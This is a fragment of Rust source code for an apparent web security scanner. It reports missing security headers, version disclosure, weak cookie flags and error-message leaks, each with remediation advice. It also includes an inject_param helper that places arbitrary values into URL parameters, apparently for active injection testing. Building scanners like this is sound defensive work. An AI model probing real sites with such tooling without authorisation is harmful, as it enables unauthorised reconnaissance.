            "Add 'Strict-Transport-Security: max-age=31536000; includeSubDomains; preload'",
        ),
        (
            "x-content-type-options",
            "Missing X-Content-Type-Options Header",
            "low",
            "Add 'X-Content-Type-Options: nosniff' to prevent MIME-type sniffing.",
        ),
        (
            "permissions-policy",
            "Missing Permissions-Policy Header",
            "info",
            "Add Permissions-Policy to restrict browser features (camera, microphone, geolocation).",
        ),
        (
            "referrer-policy",
            "Missing Referrer-Policy Header",
            "info",
            "Add 'Referrer-Policy: strict-origin-when-cross-origin' to control referrer leakage.",
        ),
        (
            "cross-origin-opener-policy",
            "Missing Cross-Origin-Opener-Policy",
            "info",
            "Add COOP header for cross-origin isolation.",
        ),
    ];

    for (header, name, severity, remediation) in &checks {
        if !headers.contains_key(*header) {
            findings.push(ScanFinding {
                id: uuid::Uuid::new_v4().to_string(),
                finding_type: "header".into(),
                name: name.to_string(),
                severity: severity.to_string(),
                confidence: "certain".into(),
                url: url.into(),
                parameter: None, payload: None,
                evidence: Some(format!("Header '{}' not found in response headers.\nPresent headers: {}", header, headers.keys().cloned().collect::<Vec<_>>().join(", "))),
                detail: format!("The response from {} does not include the '{}' security header.\n\nPresent security headers: {}\nMissing: {}\n\nThis may allow {} attacks.",
                    url, header, headers.keys().cloned().collect::<Vec<_>>().join(", "), header,
                    match *header {
                        "x-frame-options" => "clickjacking",
                        "content-security-policy" => "XSS and data injection",
                        "strict-transport-security" => "SSL stripping",
                        _ => "various"
                    }),
                remediation: remediation.to_string(),
                request_info: None,
            });
        }
    }

    if let Some(server) = headers.get("server") {
        if server.chars().any(|c| c.is_ascii_digit()) {
            findings.push(ScanFinding {
                id: uuid::Uuid::new_v4().to_string(),
                finding_type: "info_disclosure".into(),
                name: "Server Version Disclosure".into(),
                severity: "info".into(), confidence: "certain".into(),
                url: url.into(), parameter: None, payload: None,
                evidence: Some(format!("Server: {}", server)),
                detail: format!("The Server header reveals version information: '{}'\n\nThis helps attackers identify known vulnerabilities for this specific version.", server),
                remediation: "Remove or mask the Server header to prevent fingerprinting.".into(),
                request_info: None,
            });
        }
    }

    if let Some(xpb) = headers.get("x-powered-by") {
        findings.push(ScanFinding {
            id: uuid::Uuid::new_v4().to_string(),
            finding_type: "info_disclosure".into(),
            name: "Technology Stack Disclosure (X-Powered-By)".into(),
            severity: "info".into(), confidence: "certain".into(),
            url: url.into(), parameter: None, payload: None,
            evidence: Some(format!("X-Powered-By: {}", xpb)),
            detail: format!("The X-Powered-By header reveals technology: '{}'\n\nThis aids attackers in crafting targeted exploits.", xpb),
            remediation: "Remove the X-Powered-By header from server configuration.".into(),
            request_info: None,
        });
    }
}

fn passive_cookie_scan(url: &str, headers: &HashMap<String, String>, findings: &mut Vec<ScanFinding>) {
    for (key, value) in headers {
        if key != "set-cookie" {
            continue;
        }
        let lower = value.to_lowercase();
        let mut issues = Vec::new();
        if !lower.contains("httponly") {
            issues.push("missing HttpOnly flag (JavaScript can access cookie)");
        }
        if !lower.contains("secure") && url.starts_with("https") {
            issues.push("missing Secure flag (cookie sent over HTTP)");
        }
        if !lower.contains("samesite") {
            issues.push("missing SameSite attribute (vulnerable to CSRF)");
        }
        if lower.contains("samesite=none") && !lower.contains("secure") {
            issues.push("SameSite=None without Secure (browsers will reject)");
        }
        if !issues.is_empty() {
            findings.push(ScanFinding {
                id: uuid::Uuid::new_v4().to_string(),
                finding_type: "cookie".into(),
                name: "Insecure Cookie Configuration".into(),
                severity: "medium".into(), confidence: "certain".into(),
                url: url.into(), parameter: None, payload: None,
                evidence: Some(format!("Set-Cookie: {}\n\nIssues found:\n{}", value, issues.iter().map(|i| format!("• {}", i)).collect::<Vec<_>>().join("\n"))),
                detail: format!("The cookie has {} security issues:\n{}\n\nThis could allow cookie theft via XSS, transmission over unencrypted connections, or CSRF attacks.",
                    issues.len(), issues.iter().enumerate().map(|(i, iss)| format!("{}. {}", i+1, iss)).collect::<Vec<_>>().join("\n")),
                remediation: "Set all security flags:\nSet-Cookie: name=value; HttpOnly; Secure; SameSite=Strict; Path=/".into(),
                request_info: None,
            });
        }
    }
}

fn info_disclosure_scan(
    url: &str,
    body: &str,
    headers: &HashMap<String, String>,
    findings: &mut Vec<ScanFinding>,
) {
    for (sig_type, pattern, description) in INFO_DISCLOSURE_SIGS {
        if let Ok(re) = regex::Regex::new(pattern) {
            if let Some(m) = re.find(body) {
                let matched = m.as_str();
                let context_start = if m.start() > 50 { m.start() - 50 } else { 0 };
                let context_end = if m.end() + 50 < body.len() { m.end() + 50 } else { body.len() };
                let context = &body[context_start..context_end];

                findings.push(ScanFinding {
                    id: uuid::Uuid::new_v4().to_string(),
                    finding_type: "info_disclosure".into(),
                    name: format!("Information Disclosure: {}", description),
                    severity: match *sig_type {
                        "stack_trace" | "php_error" | "java_stack" | "python_tb" | "env_var" => "medium",
                        "sql_query" | "internal_path" | "debug_mode" => "medium",
                        _ => "low",
                    }.into(),
                    confidence: "firm".into(),
                    url: url.into(), parameter: None, payload: None,
                    evidence: Some(format!("Pattern: {}\nMatch: {}\nContext: ...{}...", pattern, matched, context)),
                    detail: format!("{}\n\nFound at position {} in the response body.\nMatched text: '{}'\n\nSurrounding context:\n{}", description, m.start(), matched, context),
                    remediation: "Configure production error handling to suppress detailed error messages. Use custom error pages.".into(),
                    request_info: None,
                });
            }
        }
    }
}

fn inject_param(url: &str, param: &str, value: &str) -> String {
    if let Ok(mut parsed) = url::Url::parse(url) {
        let mut found = false;
        let new_pairs: Vec<(String, String)> = parsed
            .query_pairs()
            .map(|(k, v)| {
                if k == param {
                    found = true;
                    (k.to_string(), value.to_string())
                } else {
                    (k.to_string(), v.to_string())
                }
            })
            .collect();

        if !found {
            let current = parsed.as_str().to_string();
            let sep = if parsed.query().is_some() { "&" } else { "?" };
            return format!("{}{}{}={}", current, sep, param, value);
        }

        parsed.set_query(None);
        let mut query = String::new();
        for (i, (k, v)) in new_pairs.iter().enumerate() {
            if i > 0 {
                query.push('&');
            }
            query.push_str(&format!("{}={}", k, v));
        }
        parsed.set_query(Some(&query));
        parsed.to_string()
    } else {
        url.to_string()
    }
}

fn rand_id(len: usize) -> String {
    use rand::Rng;
    const CHARS: &[u8] = b"abcdefghijklmnopqrstuvwxyz0123456789";
    let mut rng = rand::thread_rng();
    (0..len).map(|_| CHARS[rng.gen_range(0..CHARS.len())] as char).collect()
}
